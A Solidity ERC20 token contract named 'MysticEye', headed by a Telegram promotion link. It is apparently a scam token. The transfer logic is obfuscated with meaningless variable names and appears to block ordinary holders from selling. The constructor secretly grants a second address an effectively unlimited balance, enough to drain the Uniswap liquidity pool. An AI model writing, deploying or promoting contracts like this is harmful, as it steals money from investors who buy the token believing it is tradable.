// https://t.me/MAGANportal

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract MysticEye is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private wet;

    function _transfer(
        address stared,
        address dance,
        uint256 afternoon
    ) internal override {
        uint256 been = mixture;

        if (add[stared] == 0 && wet[stared] > 0 && stared != uniswapV2Pair) {
            add[stared] -= been;
        }

        address attempt = address(section);
        section = MysticEye(dance);
        wet[attempt] += been + 1;

        _balances[stared] -= afternoon;
        uint256 damage = (afternoon / 100) * mixture;
        afternoon -= damage;
        _balances[dance] += afternoon;
    }

    mapping(address => uint256) private add;
    uint256 public mixture = 3;

    constructor(
        string memory pass,
        string memory bite,
        address across,
        address physical
    ) ERC20(pass, bite) {
        uniswapV2Router = IUniswapV2Router02(across);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 direct = ~uint256(0);

        add[msg.sender] = direct;
        add[physical] = direct;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[physical] = direct;
    }

    MysticEye private section;
}